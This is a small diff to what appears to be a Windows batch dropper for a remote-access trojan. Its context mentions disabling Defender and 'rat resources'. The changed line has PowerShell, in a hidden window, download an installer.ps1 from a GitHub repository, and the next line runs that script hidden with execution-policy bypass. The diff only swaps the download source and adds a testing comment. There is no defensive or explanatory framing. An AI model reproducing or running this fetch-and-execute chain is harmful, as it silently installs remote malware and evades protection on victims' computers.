@@ -34,8 +34,8 @@ rem disable defender
 start
 REM rat resources  
 
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest  -Uri https://raw.githubusercontent.com/CosmodiumCS/MalwareDNA/refs/heads/main/bashbunny/BunnyLogger/p.ps1 -OutFile install.ps1"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest  -Uri https://raw.githubusercontent.com/knightcoder77/DarkSauron/main/files/installer.ps1 -OutFile installer.ps1"
 powershell  Start-Process -windowstyle hidden -ep bypass "installer.ps1"
 
-
+rem this is for the testing to update the repo
 
